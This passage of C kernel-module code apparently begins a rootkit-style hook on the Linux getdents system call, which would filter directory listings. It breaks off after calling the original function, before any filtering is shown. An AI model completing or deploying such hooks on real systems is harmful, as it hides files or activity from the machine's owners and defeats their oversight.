...
asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
    struct linux_dirent *filtered_dirp, *last_filtered, *temp_dirp;
    size_t name_len;
    unsigned long copy_res;
    int orig_bytes_read, res_bytes_read, remaining_bytes;

    orig_bytes_read = original_getdents(fd, dirp, count);
